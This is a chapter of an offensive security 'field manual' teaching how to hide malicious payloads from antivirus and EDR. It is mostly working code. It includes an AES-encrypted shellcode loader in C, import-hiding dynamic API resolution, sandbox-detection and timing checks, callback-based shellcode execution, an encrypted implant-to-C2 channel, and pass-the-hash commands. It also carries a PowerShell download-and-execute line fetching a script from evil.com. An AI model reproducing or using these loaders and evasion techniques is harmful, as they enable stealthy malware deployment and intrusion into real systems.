# Chapter 18 — Cryptography & Evasion: The Art of Hiding

**VADER-RCE Field Manual**
**Prerequisite**: Chapter 17 (Network Warfare), GaySun XOR payload experience
**Drill**: DRILLS/18_crypto_evasion/

---

## Why You Need This

You've built payloads. You've corrupted memory. You've pivoted through
networks. None of that matters if Defender catches you at the door.

Modern AV/EDR is a layered defense: static signature matching, behavioral
heuristics, memory scanning, API hook monitoring, cloud-based ML
classification. Each layer is a filter. Your payload has to pass through
ALL of them to execute.

Cryptography is your primary tool for evading static analysis. If
Defender can't read your payload, it can't match a signature against
it. But encryption alone isn't enough — you also need to evade behavioral
detection (what your code DOES), heuristic detection (what your code
LOOKS LIKE it might do), and memory scanning (what's in memory after
decryption).

This chapter covers both sides: the crypto fundamentals you need to
understand encryption/decryption in offensive operations, and the
evasion techniques that use those fundamentals to get past modern
defenses. You already used XOR in GaySun. Now you learn WHY it worked,
when it won't work, and what to use instead.

---

## WINDOWS SETUP

Every tool used in this chapter. Install everything before you start the drills.

### Python Cryptography Library — pycryptodome

**This is required before ANY Python code block in this chapter will run.**
Without it you get `ModuleNotFoundError: No module named 'Crypto'` on the very
first import line.

```powershell
# Install pycryptodome — provides the Crypto.* namespace used throughout
pip install pycryptodome

# Verify it installed correctly
python -c "from Crypto.Cipher import AES; print('pycryptodome OK')"
# Expected output: pycryptodome OK
```

**If you get "pip is not recognized":**
```powershell
python -m pip install pycryptodome
```

**If you have an old `pycrypto` installed (conflict):**
```powershell
pip uninstall pycrypto
pip install pycryptodome
```

### Hashcat — GPU Hash Cracker

Download: https://hashcat.net/hashcat/  
Download the Windows binary release (`.7z` file). Extract to `C:\hashcat\`.

```powershell
# Add to PATH for this session (run from extraction folder)
$env:PATH += ";C:\hashcat"

# Verify
hashcat --version
# Expected output: v6.2.6 (or similar version number)
```

**No admin rights required for hashcat itself.** GPU driver must be installed
(NVIDIA/AMD). If you see "No OpenCL platforms found", install your GPU drivers.

### Hashcat Wordlists

```powershell
# Download rockyou.txt (standard wordlist, ~133MB)
# Direct link: https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
# Save to C:\hashcat\wordlists\rockyou.txt

# Verify
(Get-Item C:\hashcat\wordlists\rockyou.txt).Length
# Expected: ~139921497 (about 133MB)
```

### John the Ripper

John the Ripper runs on Linux. It requires WSL2.

```powershell
# Install WSL2 (requires admin, one-time setup)
wsl --install

# After reboot, inside WSL2 terminal:
sudo apt update && sudo apt install -y john
john --version
# Expected output: John the Ripper 1.9.0-jumbo-1 (or later)
```

> **Admin rights required** for `wsl --install`. Run that PowerShell command
> as Administrator. Everything after the reboot is normal user.

### Impacket Tools (ntlmrelayx, psexec, etc.)

Impacket is a Python library. Best run from WSL2 or a Kali/Parrot VM.

```bash
# Inside WSL2:
pip3 install impacket

# Verify
python3 -c "import impacket; print(impacket.__version__)"
# Expected output: a version string like 0.11.0
```

### evil-winrm

Requires WSL2 (Ruby-based tool).

```bash
# Inside WSL2:
sudo gem install evil-winrm

# Verify
evil-winrm --version
# Expected output: Evil-WinRM shell v3.x
```

### UPX Packer (optional, for packing section)

Download: https://upx.github.io/  
Windows binary available. Extract `upx.exe` to `C:\tools\`.

```powershell
C:\tools\upx.exe --version
# Expected output: Ultimate Packer for eXecutables ... v4.x
```

### PadBuster (optional, for padding oracle section)

Requires WSL2 and Perl.

```bash
# Inside WSL2:
sudo apt install -y libwww-perl
wget https://raw.githubusercontent.com/AonCyberLabs/PadBuster/master/padBuster.pl
chmod +x padBuster.pl
perl padBuster.pl --help
# Expected: usage information printed to screen
```

### C Compiler (for C code blocks)

The C loader examples in this chapter are conceptual reference. To actually
compile them you need a Windows C compiler.

```powershell
# Option 1: Visual Studio Build Tools (free, no IDE)
# Download: https://visualstudio.microsoft.com/downloads/#build-tools-for-visual-studio-2022
# Install "Desktop development with C++" workload

# Verify after install (open Developer Command Prompt)
cl.exe
# Expected: Microsoft C/C++ Optimizing Compiler version XX.XX

# Option 2: MinGW-w64 (lighter, gcc on Windows)
# Download: https://www.mingw-w64.org/downloads/ → WinLibs standalone
# Extract, add bin\ folder to PATH
gcc --version
# Expected: gcc (MinGW-W64) 13.x.x or similar
```

> **Admin rights required** for Visual Studio Build Tools installer.

---

## Crypto Fundamentals — What You Actually Need

Skip the academic theory. You don't need to prove RSA's correctness
or implement AES from scratch. You need to know what each primitive
does, when to use it, and how defenders break it.

### Symmetric Encryption — One Key, Two Directions

Same key encrypts and decrypts. Fast. Used for bulk data.

**XOR — The Simplest Cipher**

You already know this from GaySun. XOR is reversible:

```
plaintext  XOR key = ciphertext
ciphertext XOR key = plaintext
```

```python
# XOR encryption/decryption — identical operation
def xor_crypt(data: bytes, key: bytes) -> bytes:
    # For every byte in data, XOR it with the corresponding key byte
    # (i % len(key)) makes the key repeat if it's shorter than data
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

shellcode = b"\xfc\x48\x83\xe4\xf0..."  # your raw shellcode bytes
key = b"\xde\xad\xbe\xef"               # 4-byte XOR key

encrypted = xor_crypt(shellcode, key)    # encrypt — XOR with key
decrypted = xor_crypt(encrypted, key)    # decrypt — same function, same key, reverses it
assert decrypted == shellcode            # sanity check: should be identical to original
```

### Expected Output

**Success:**
```
(no output — assert passes silently)
```

**Failure looks like `AssertionError` — means the decrypt didn't produce the
original bytes. Check you're using the same key for both calls.**

**Failure looks like `ModuleNotFoundError` — you haven't run `pip install pycryptodome` yet.**

---

**XOR's weakness**: With a short repeating key, XOR is trivially
broken by frequency analysis. Defender KNOWS this. Modern AV engines
XOR-decode suspicious blobs with common key lengths (1-16 bytes) and
check the result against signature databases. A 4-byte XOR key buys
you nothing against a competent scanner.

**When XOR still works**: Single-byte XOR against a unique key that
changes per build. Not for the crypto — for the obfuscation. It forces
the scanner to brute-force 256 possible decodings. Combined with other
techniques, it adds friction.

**AES — The Standard**

AES-128, AES-192, AES-256. Block cipher operating on 16-byte blocks.
This is what you use when you actually need encryption that holds up.

```python
from Crypto.Cipher import AES          # requires: pip install pycryptodome
from Crypto.Util.Padding import pad, unpad  # pad = add PKCS7 padding, unpad = strip it
from Crypto.Random import get_random_bytes  # cryptographically secure random bytes
import os

def aes_encrypt(plaintext: bytes, key: bytes) -> tuple:
    iv = get_random_bytes(16)           # random 16-byte IV — different every call
    cipher = AES.new(key, AES.MODE_CBC, iv)  # CBC mode cipher object
    # pad() adds bytes to make plaintext length a multiple of block_size (16)
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
    return iv, ciphertext               # return both — you need IV to decrypt

def aes_decrypt(iv: bytes, ciphertext: bytes, key: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_CBC, iv)  # reconstruct cipher with same IV + key
    return unpad(cipher.decrypt(ciphertext), AES.block_size)  # decrypt then strip padding

# Generate a random 256-bit key (32 bytes = AES-256)
key = get_random_bytes(32)

# Encrypt shellcode
shellcode = b"\xfc\x48\x83\xe4\xf0..."  # your shellcode bytes here
iv, encrypted = aes_encrypt(shellcode, key)

# Decrypt at runtime
decrypted = aes_decrypt(iv, encrypted, key)
```

### Expected Output

**Success:**
```
(no output — decrypted will equal shellcode if you print/compare them)
```

**Quick test you can run:**
```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

key = get_random_bytes(32)
plaintext = b"hello world test"
iv = get_random_bytes(16)
cipher = AES.new(key, AES.MODE_CBC, iv)
ct = cipher.encrypt(pad(plaintext, AES.block_size))
cipher2 = AES.new(key, AES.MODE_CBC, iv)
pt = unpad(cipher2.decrypt(ct), AES.block_size)
print(pt)  # b'hello world test'
```

**Failure looks like `ValueError: Data must be aligned to block boundary in ECB mode` — means your plaintext wasn't padded before encrypting. Always use `pad()` on the input.**

**Failure looks like `ValueError: Padding is incorrect` on decrypt — means you're using a different IV or key to decrypt than you used to encrypt.**

---

**CBC mode**: Each block is XOR'd with the previous ciphertext block
before encryption. The first block uses the Initialization Vector (IV).
This means identical plaintext blocks produce different ciphertext
blocks — no patterns leak through.

**Why AES defeats static analysis**: Without the key, the ciphertext
is indistinguishable from random data. Defender can't brute-force a
256-bit key. It can't apply signature matching to random bytes. The
payload is invisible until runtime decryption.

**RC4 — Stream Cipher, Simple Implementation**

RC4 is broken for TLS but perfectly fine for payload encryption. It's
a stream cipher — generates a keystream from the key and XORs it with
the plaintext. Simpler to implement than AES, smaller code footprint.

```python
# RC4 implementation — small enough to embed in a loader
# No external imports needed — pure Python
def rc4(key: bytes, data: bytes) -> bytes:
    S = list(range(256))    # state array — 256 values, 0-255
    j = 0
    # Key-scheduling algorithm (KSA) — shuffles S using the key
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256  # key byte cycles if key is short
        S[i], S[j] = S[j], S[i]                    # swap — scrambles S based on key
    # Pseudo-random generation algorithm (PRGA) — generates keystream
    i = j = 0
    result = bytearray()
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]                    # another swap
        result.append(byte ^ S[(S[i] + S[j]) % 256])  # XOR data byte with keystream byte
    return bytes(result)

encrypted = rc4(b"my_secret_key", shellcode)         # encrypt
decrypted = rc4(b"my_secret_key", encrypted)         # decrypt — same function, same key
```

### Expected Output

**Success:**
```python
shellcode = b"\xfc\x48\x83\xe4\xf0\x50\x57"
enc = rc4(b"my_secret_key", shellcode)
dec = rc4(b"my_secret_key", enc)
print(dec == shellcode)   # True
print(enc.hex())          # something like: 8a3f7c1d2e... (different from input)
```

**Failure looks like `TypeError: 'int' object is not subscriptable` — means `key` was passed as a string not bytes. Use `b"key"` not `"key"`.**

---

**RC4 in the wild**: Cobalt Strike uses RC4 for stager communication.
Metasploit's `shikata_ga_nai` encoder uses a polymorphic XOR scheme
that's conceptually similar. Many real-world implants use RC4 because
it's fast, simple, and good enough for obfuscation.

### Asymmetric Encryption — Two Keys

Public key encrypts. Private key decrypts. Or: private key signs,
public key verifies. The math is hard to reverse (factoring large
primes for RSA, discrete logarithms for ECC).

**Where you'll encounter this in offensive ops**:
- **TLS/SSL**: Every HTTPS connection uses asymmetric crypto for key
  exchange, then symmetric crypto for the actual data. Your C2 traffic
  over HTTPS is protected by this.
- **SSH**: Key-based authentication uses RSA/Ed25519 keypairs.
- **Code signing**: Legitimate software is signed with a private key.
  Defenders check signatures. If you can sign your payload with a
  stolen code-signing certificate, it bypasses signature-based trust.
- **Key exchange**: Your implant and C2 server need a shared secret
  for symmetric encryption. Diffie-Hellman or RSA key exchange
  establishes this without ever transmitting the key in the clear.

```python
from Crypto.PublicKey import RSA        # requires: pip install pycryptodome
from Crypto.Cipher import PKCS1_OAEP   # OAEP = padding scheme for RSA encryption

# Generate RSA keypair (done once, offline — store the private key securely)
key = RSA.generate(2048)               # 2048-bit key — standard minimum
private_key = key.export_key()         # PEM-encoded private key bytes
public_key = key.publickey().export_key()  # PEM-encoded public key bytes

# Encrypt with public key (anyone can do this — public key can be distributed)
recipient_key = RSA.import_key(public_key)
cipher = PKCS1_OAEP.new(recipient_key)            # OAEP cipher using public key
encrypted = cipher.encrypt(b"secret_session_key_here")  # max ~214 bytes for 2048-bit RSA

# Decrypt with private key (only the key holder can do this)
private = RSA.import_key(private_key)
decipher = PKCS1_OAEP.new(private)                # OAEP cipher using private key
decrypted = decipher.decrypt(encrypted)            # recovers the original plaintext
```

### Expected Output

**Success:**
```python
print(decrypted)  # b'secret_session_key_here'
```

**Failure looks like `ValueError: RSA key format is not supported` — means the key bytes got corrupted or you passed the wrong variable. Print `private_key` and check it starts with `-----BEGIN RSA PRIVATE KEY-----`.**

**Failure looks like `ValueError: Plaintext is too long` — RSA can only encrypt small amounts of data (up to ~214 bytes for a 2048-bit key). Use RSA to encrypt a small AES key, then use AES for the actual payload.**

---

### Hashing — One-Way Functions

Hashing takes arbitrary-length input and produces a fixed-length digest.
It's one-way — you can't reverse a hash to get the original input. You
can only compare: does this input produce the same hash?

**Hash algorithms you'll encounter**:

| Algorithm | Output | Status | Where you'll see it |
|-----------|--------|--------|-------------------|
| MD5 | 128-bit | BROKEN (collisions) | Legacy file checksums, some password stores |
| SHA-1 | 160-bit | BROKEN (collisions) | Legacy certificate signing, git commits |
| SHA-256 | 256-bit | Current standard | File integrity, modern password hashing |
| SHA-512 | 512-bit | Strong | Linux /etc/shadow (sha512crypt) |
| NTLM | 128-bit | WEAK (unsalted MD4) | Windows password hashes. Your bread and butter. |
| NTLMv2 | Variable | Better (challenge-response) | Windows network authentication |
| Net-NTLMv2 | Variable | Challenge-response | What Responder captures |

**Why NTLM hashes are as good as passwords**:

NTLM is just `MD4(UTF-16LE(password))`. No salt. No iterations. Two
users with the same password have the same NTLM hash. And here's the
critical part for offensive ops: **Windows accepts NTLM hashes directly
for authentication.** You don't need to crack the hash to use it.

```bash
# Pass-the-Hash — authenticate with the hash, no password needed
# Using evil-winrm (run inside WSL2):
evil-winrm -i <target> -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Using impacket's psexec (run inside WSL2):
python psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 administrator@<target>

# Using crackmapexec (run inside WSL2):
crackmapexec smb <target> -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
```

### Expected Output

**evil-winrm success:**
```
Evil-WinRM shell v3.x
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

**Failure looks like `ERROR: An error of type WinRM::WinRMAuthorizationError` — means the hash is wrong, the account doesn't have WinRM access, or WinRM is not enabled on the target.**

**Failure looks like `Connection refused` — WinRM is not listening (port 5985/5986 closed). Try psexec instead.**

---

This is why NTLM hash extraction (from SAM, LSASS, DCSync) is such a
high-value post-exploitation step. The hash IS the credential.

---

## Encryption In Offensive Operations

### Encrypting Payloads

The goal: your payload binary/shellcode should look like random noise
to any static analysis tool until the moment it executes.

**The pattern**:
1. Generate shellcode (msfvenom, custom, whatever)
2. Encrypt it with a strong algorithm and unique key
3. Build a loader that contains: encrypted blob + decryption routine + key
4. At runtime: decrypt → allocate executable memory → copy → execute

```c
// C loader structure — the pattern every AV-evading loader follows
// Compile with: cl.exe loader.c /link bcrypt.lib  (or gcc -o loader loader.c -lbcrypt)
#include <windows.h>
#include <stdio.h>

// AES-encrypted shellcode blob (generated by your Python encryptor script)
// These are placeholder bytes — replace with real output from aes_encrypt()
unsigned char encrypted_shellcode[] = { 0x8a, 0x3f, 0x7c, ... };
unsigned char aes_key[] = { 0x01, 0x02, 0x03, ... };  // 32 bytes = AES-256 key
unsigned char aes_iv[]  = { 0xa1, 0xb2, 0xc3, ... };  // 16 bytes = CBC initialization vector

// AES-CBC decryption using Windows CNG (Cryptography Next Generation)
// CNG is built into Windows — no external crypto library needed in the binary
BOOL decrypt_payload(unsigned char* ciphertext, DWORD ct_len,
                     unsigned char* key, unsigned char* iv,
                     unsigned char** plaintext, DWORD* pt_len) {
    BCRYPT_ALG_HANDLE hAlg;   // algorithm provider handle
    BCRYPT_KEY_HANDLE hKey;   // key object handle

    // Open AES algorithm provider from the built-in CNG library
    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    // Set chaining mode to CBC
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                      sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    // Import our key bytes into a CNG key object
    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key, 32, 0);

    // First call: get the output size without actually decrypting
    BCryptDecrypt(hKey, ciphertext, ct_len, NULL, iv, 16, NULL, 0, pt_len, BCRYPT_BLOCK_PADDING);

    // Allocate output buffer now that we know the size
    *plaintext = (unsigned char*)malloc(*pt_len);
    // Second call: actually decrypt into the buffer
    BCryptDecrypt(hKey, ciphertext, ct_len, NULL, iv, 16, *plaintext, *pt_len, pt_len, BCRYPT_BLOCK_PADDING);

    BCryptDestroyKey(hKey);             // clean up key object
    BCryptCloseAlgorithmProvider(hAlg, 0);  // clean up algorithm handle
    return TRUE;
}

int main() {
    unsigned char* shellcode;   // will hold decrypted shellcode
    DWORD shellcode_len;        // will hold its length

    // Decrypt at runtime — plaintext shellcode never on disk
    decrypt_payload(encrypted_shellcode, sizeof(encrypted_shellcode),
                    aes_key, aes_iv, &shellcode, &shellcode_len);

    // Allocate RW memory (not RWX yet — changing permissions separately is less suspicious)
    void* exec = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE,
                              PAGE_READWRITE);
    memcpy(exec, shellcode, shellcode_len);  // copy decrypted shellcode into allocated region

    // Flip to executable — this permission change is what EDR watches
    DWORD old;  // old permissions stored here (required by VirtualProtect)
    VirtualProtect(exec, shellcode_len, PAGE_EXECUTE_READ, &old);

    // Cast the memory region to a function pointer and call it
    ((void(*)())exec)();

    return 0;
}
```

### Expected Output

**This is a C skeleton — it won't compile until you replace the `...` placeholders.**
The pattern to test: run your Python `aes_encrypt()` to produce real byte arrays,
paste them in place of the placeholder arrays, compile, and test in a VM.

**Failure looks like `LNK2019: unresolved external symbol BCrypt...` — means you forgot to link `bcrypt.lib`. Add `/link bcrypt.lib` to your compile command.**

**Failure looks like `Access violation` on the `((void(*)())exec)()` line — the shellcode is either corrupted during decryption or the key/IV don't match what was used to encrypt.**

---

**Key management for payloads**: The key has to be in the binary
somewhere (or derived at runtime). Options:
- **Hardcoded key**: Simplest. Key is in the binary. Defender could
  extract it and decrypt — but it has to KNOW it's a key first. Combined
  with string obfuscation, this works.
- **Environmental keying**: Derive the key from the target environment
  (hostname, domain name, username, MAC address). The payload only
  decrypts on the intended target. Sandbox analysis fails because the
  sandbox has different environment values.
- **Remote key fetch**: Payload calls home to get the key. If the C2
  server is down, the payload never decrypts. Clean forensics.
- **Staged delivery**: First stage is tiny and innocuous — it downloads
  and decrypts the second stage. The encrypted payload never touches
  disk as a file.

### Encrypting C2 Traffic

Your implant needs to talk to your server. That traffic needs to be
encrypted and look legitimate.

**TLS (HTTPS C2)**: The easiest option. Your C2 traffic looks like
normal HTTPS browsing. Use legitimate certificates (Let's Encrypt),
domain fronting (if still available), or CDN redirectors.

**Custom crypto channel**: For situations where you need more control:

```python
# Simple encrypted C2 communication pattern
# Requires: pip install pycryptodome
import socket
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
import struct  # for packing/unpacking binary integers

SHARED_KEY = b'\x00' * 32  # 32-byte AES-256 key — in reality, derived via key exchange

def encrypt_msg(plaintext: bytes) -> bytes:
    iv = get_random_bytes(16)              # fresh random IV for each message
    cipher = AES.new(SHARED_KEY, AES.MODE_CBC, iv)
    ct = cipher.encrypt(pad(plaintext, AES.block_size))
    # Pack as: [4-byte length][16-byte IV][ciphertext]
    # '>I' = big-endian unsigned int (4 bytes) for the length prefix
    return struct.pack('>I', len(ct)) + iv + ct

def decrypt_msg(data: bytes) -> bytes:
    length = struct.unpack('>I', data[:4])[0]  # read 4-byte length prefix
    iv = data[4:20]                             # next 16 bytes are the IV
    ct = data[20:20+length]                     # rest is ciphertext
    cipher = AES.new(SHARED_KEY, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), AES.block_size)

# Implant sends encrypted tasking result
def send_result(sock, result: bytes):
    encrypted = encrypt_msg(result)  # encrypt before sending
    sock.send(encrypted)

# C2 server receives and decrypts
def recv_task(sock) -> bytes:
    data = sock.recv(4096)           # receive raw encrypted bytes
    return decrypt_msg(data)         # decrypt and return plaintext
```

### Expected Output

**Loopback test to verify encrypt/decrypt round-trip:**
```python
msg = b"whoami result: NT AUTHORITY\\SYSTEM"
encrypted = encrypt_msg(msg)
print(f"Encrypted length: {len(encrypted)} bytes")   # longer than plaintext due to IV + padding
decrypted = decrypt_msg(encrypted)
print(decrypted)   # b'whoami result: NT AUTHORITY\\SYSTEM'
```

**Failure looks like `struct.error: unpack requires a buffer of 4 bytes` — means the received data is incomplete. Your recv() didn't get the full message. In real code, loop recv() until you have all bytes.**

---

**Malleable C2 profiles** (Cobalt Strike concept): Shape your C2 traffic
to mimic legitimate application traffic — match HTTP headers, URI
patterns, user-agent strings, and timing of a real application. The
encrypted payload rides inside what looks like normal API calls.

---

## Encoding vs Encryption vs Obfuscation

These are NOT interchangeable. Confusing them is how payloads get caught.

### Encoding — Reversible Without a Key

Encoding transforms data into a different representation. No key needed
to reverse it. Base64, URL encoding, hex encoding — these are FORMAT
CONVERSIONS, not security measures.

```bash
# Base64 encoding a PowerShell command
echo -n 'IEX(New-Object Net.WebClient).DownloadString("http://evil.com/shell.ps1")' | base64

# Defender's response to base64:
# "Oh look, a base64 string being passed to PowerShell. Let me decode it.
#  Yep, that's malicious. Blocked."

# AMSI literally decodes base64 before scanning
# Base64 is NOT evasion. It's a FORMAT.
```

**When encoding IS useful**: Not for hiding content, but for transport.
Base64 a binary payload to embed it in a text-based protocol (HTTP,
DNS TXT records). The encoding solves a transport problem, not a
detection problem.

### Encryption — Requires a Key to Reverse

Encryption transforms data using a key. Without the key, the data is
unrecoverable. This IS a security measure.

**The spectrum of strength against AV**:
- **Single-byte XOR**: Defender brute-forces all 256 keys. Trivially
  broken. Maybe buys you 10 seconds of analysis time.
- **Multi-byte XOR (short key)**: Defender tries common key lengths
  (2-32 bytes). Crackable via frequency analysis. Slightly better.
- **XOR with key = length of payload**: One-time pad. Theoretically
  unbreakable. But storing a key the same size as the payload is
  impractical and the key itself looks suspicious.
- **AES-CBC with random key**: Defender cannot break this with static
  analysis. The ciphertext is indistinguishable from random data.
  The key must be somewhere in the binary or derived at runtime —
  that's the weak point, but it's a much harder problem for automated
  scanners.

### Obfuscation — Making Code Hard to Read

Obfuscation doesn't hide data — it makes the CODE harder to analyze.
Variable renaming, control flow flattening, dead code insertion, string
splitting.

```python
# Before obfuscation:
import subprocess
subprocess.Popen(["powershell", "-ep", "bypass", "-c", "IEX(...)"])

# After basic obfuscation:
import subprocess as _0x1f
# Build the string "powershell" by concatenating individual character codes
_0x2a = chr(112)+chr(111)+chr(119)+chr(101)+chr(114)+chr(115)+chr(104)+chr(101)+chr(108)+chr(108)
_0x3b = [_0x2a, "-ep", "bypass", "-c", "IEX(...)"]
# Call subprocess.Popen by constructing the attribute name via chr() calls
getattr(_0x1f, chr(80)+chr(111)+chr(112)+chr(101)+chr(110))(_0x3b)

# After GOOD obfuscation:
# Control flow is flattened, strings are encrypted, API calls are resolved
# dynamically, dead code paths are inserted, variable names are randomized.
# A human reverser needs hours. Automated analysis needs specific deobfuscation.
```

**The hierarchy**: Encoding < Obfuscation < Encryption. Use encryption
for the payload, obfuscation for the loader code, and encoding only
for transport.

---

## AV/EDR Evasion Taxonomy

Modern endpoint security operates in multiple layers. Understanding
each layer tells you what technique evades which detection mechanism.

### Signature Evasion — Change What You Look Like

Signature-based detection matches known byte patterns. Change the
bytes and the signature doesn't match.

**String mutation**: AV signatures often match on specific strings in
the binary — function names, hardcoded URLs, known shellcode patterns.

```c
// Before: Defender signatures match "VirtualAlloc" string import
// The string "VirtualAlloc" appears literally in the binary's import table
void* exec = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

// After: Dynamic API resolution — no "VirtualAlloc" string in binary
// Define a function pointer type matching VirtualAlloc's signature
typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);

// XOR-encrypted function name — the string "VirtualAlloc" never appears in plaintext
unsigned char enc_name[] = { 0x36, 0x49, 0x52, 0x54, 0x55, 0x41, 0x4c, ... };
char func_name[32];
xor_decrypt(enc_name, sizeof(enc_name), func_name, xor_key);  // decrypt to "VirtualAlloc" at runtime

// Get the function address dynamically — no import table entry
pVirtualAlloc myAlloc = (pVirtualAlloc)GetProcAddress(
    GetModuleHandleA("kernel32.dll"), func_name);  // resolve at runtime
void* exec = myAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
```

**Packing/Compression**: Pack the entire binary with UPX or a custom
packer. The unpacking stub is small and benign-looking. The actual
payload is compressed/encrypted in the packed section.

```bash
# UPX packing — basic, but most AV now unpacks UPX automatically
upx --best payload.exe -o packed.exe

# Custom packers are more effective because AV doesn't have a generic
# unpacker for them. Writing a custom packer is a solid exercise.
```

### Expected Output

```
Ultimate Packer for eXecutables ... packed -> packed.exe (ratio: ~0.xx)
```

**Failure looks like `NotPackedException: payload.exe is not packed by UPX` when trying to unpack something not packed — this is fine, you're packing not unpacking.**

**Failure looks like `CantPackException: file is too small` — UPX needs at least a valid PE binary. You can't pack a .py or .txt file.**

---

**Metamorphism**: Generate functionally identical code with different
byte sequences each time. Same behavior, different signature. This is
what advanced malware frameworks do — every build produces a unique binary.

### Behavioral Evasion — Change What You Do (Or When)

Behavioral detection watches what your code DOES at runtime. Allocating
RWX memory, writing shellcode to it, creating remote threads — these
are behavioral indicators.

**Hardware Breakpoints (HWBP)**: You already did this. Setting hardware
breakpoints on ntdll functions to intercept and modify behavior before
EDR hooks see it.

**Sleep timers and delayed execution**: Sandboxes have time limits. If
your payload sleeps for 5 minutes before doing anything malicious, the
sandbox times out and reports "benign." But modern sandboxes fast-forward
sleep calls — so you need smarter delays:

```c
// Naive sleep — sandbox detects and fast-forwards
Sleep(300000);  // 5 minutes — sandbox patches this to return immediately

// Better: time-based check using a CPU-intensive loop
DWORD start = GetTickCount();  // record start time in milliseconds
// Do some busy work (calculate primes, allocate/free memory, etc.)
volatile int x = 0;            // volatile prevents compiler from optimizing loop away
for (int i = 0; i < 100000000; i++) x += i;  // ~1 second of real CPU work
DWORD elapsed = GetTickCount() - start;       // how long did that actually take?

// If elapsed < 1000ms, we're in a sandbox that fast-forwarded our busy loop
// On real hardware this loop takes ~1 second; in a fast-forwarding sandbox it takes ~0ms
if (elapsed < 1000) ExitProcess(0);  // exit clean — looks benign to sandbox

// Even better: use NtDelayExecution and check with QueryPerformanceCounter
// Sandboxes that hook Sleep might not hook the NT-level equivalent
```

**Environment checks**: Detect sandboxes before executing the payload:

```c
// Check for common sandbox indicators — returns TRUE if we're probably in a sandbox
BOOL is_sandbox() {
    // Check RAM (sandboxes often have <4GB to save resources)
    MEMORYSTATUSEX mem;
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < 4LL * 1024 * 1024 * 1024) return TRUE;  // less than 4GB

    // Check CPU cores (sandboxes often have 1-2 cores)
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return TRUE;  // single-core = suspicious

    // Check for recent user interaction (sandbox = no mouse movement)
    LASTINPUTINFO lii;
    lii.cbSize = sizeof(lii);
    GetLastInputInfo(&lii);
    if ((GetTickCount() - lii.dwTime) > 600000) return TRUE;  // 10min idle = no human

    // Check disk size (sandbox disks are often <60GB)
    ULARGE_INTEGER disk;
    GetDiskFreeSpaceExA("C:\\", NULL, &disk, NULL);
    if (disk.QuadPart < 60LL * 1024 * 1024 * 1024) return TRUE;  // <60GB total = VM

    // Check for VM artifacts
    // Registry: HKLM\SOFTWARE\VMware, Inc.
    // Files: C:\windows\system32\drivers\vmhgfs.sys
    // Processes: vmtoolsd.exe, vmwaretray.exe
    // MAC address prefixes: 00:0C:29, 00:50:56 (VMware)

    return FALSE;  // passed all checks — probably a real system
}
```

### Heuristic Evasion — Don't Look Suspicious

Heuristic engines analyze code patterns without specific signatures.
"This binary allocates RWX memory, writes to it, then calls it as a
function — that's suspicious regardless of what it writes."

**API call patterns**: Instead of the classic
`VirtualAlloc→memcpy→VirtualProtect→CreateThread` chain that every
shellcode loader uses, break the pattern:

```c
// Classic pattern — every EDR flags this sequence
void* mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
memcpy(mem, shellcode, size);
DWORD old;
VirtualProtect(mem, size, PAGE_EXECUTE_READ, &old);
CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);

// Pattern-broken version — same result, different API sequence:
// 1. Use HeapAlloc instead of VirtualAlloc
void* mem = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size + 0x1000);
// 2. Copy in 64-byte chunks with tiny delays — breaks memcpy-then-protect signature
for (int i = 0; i < size; i += 64) {
    memcpy((char*)mem + i, shellcode + i, min(64, size - i));
    SleepEx(1, FALSE);  // 1ms delay between copies — breaks timing heuristics
}
// 3. Use NtProtectVirtualMemory instead of VirtualProtect (lower-level, fewer hooks)
// 4. Execute via callback — no CreateThread call at all
EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, 0);
// Windows calls YOUR code as a callback. No CreateThread needed.
```

**Callback execution techniques** — ways to execute shellcode without
calling `CreateThread` or `CreateRemoteThread`:

```c
// These all execute a function pointer through legitimate Windows callbacks:
// Windows passes your shellcode_addr as a function pointer it then calls internally
EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)shellcode_addr, 0);
EnumChildWindows(NULL, (WNDENUMPROC)shellcode_addr, 0);
EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)shellcode_addr, 0);
// Timer-based: Windows calls shellcode_addr after 0ms timeout
CreateTimerQueueTimer(&timer, NULL, (WAITORTIMERCALLBACK)shellcode_addr, NULL, 0, 0, 0);
```

### Memory Evasion — Hide What's In RAM

EDR scans process memory looking for known shellcode patterns. Even
after your encrypted payload decrypts and executes, the decrypted
shellcode is in memory and scannable.

**Encrypted sleep**: After the payload executes each task, re-encrypt
itself in memory before sleeping. Decrypt again when the next task
arrives. Reduces the window where scannable shellcode exists in memory.

